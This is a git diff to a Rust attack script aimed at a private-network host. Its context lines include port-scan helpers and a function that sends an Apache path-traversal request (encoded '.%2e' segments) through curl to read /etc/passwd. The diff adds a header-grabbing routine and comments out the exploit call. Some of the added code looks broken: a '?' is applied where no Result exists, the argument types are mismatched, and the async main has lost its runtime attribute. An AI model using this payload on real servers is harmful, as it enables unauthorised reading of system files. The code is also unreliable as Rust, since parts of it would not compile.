@@ -2,6 +2,7 @@ use std::net::TcpStream;
 use std::process::{Command, Output};
 use reqwest;
 use reqwest::{RequestBuilder, Url};
+use reqwest::{blocking::Client, header};
 
 fn ping_ip(ip_address: &str) -> Result<(), String> {
     let command = Command::new("ping")
@@ -34,6 +35,21 @@ fn scan_ports(target_ip: &str) {
 
 
 
+
+pub fn get_apache_headers(target_url: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let client = Client::new();
+
+    let res = client.get(target_url)?
+        .header(header::HOST, target_url)
+        .send()?;
+
+    for (name, value) in res.headers().iter() {
+        println!("{}: {}", name, value);
+    }
+
+    Ok(())
+}
+
 async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", target_ip);
     let command_output: Output = Command::new("curl")
@@ -53,18 +69,15 @@ async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error
     }
 }
 
-
-
-
-
-#[tokio::main]
 async fn main() {
     let ip_address = "192.168.1.122";
+    let url = format!("http://{}",ip_address);
 
     //match ping_ip(ip_address) {
     //    Ok(_) => scan_ports(ip_address),
     //    Err(_) => {}
     //}
-    exploit_apache(ip_address).await.expect("TODO: panic message");
+    //exploit_apache(ip_address).await.expect("TODO: panic message");
 
+    get_apache_headers(url);
 }
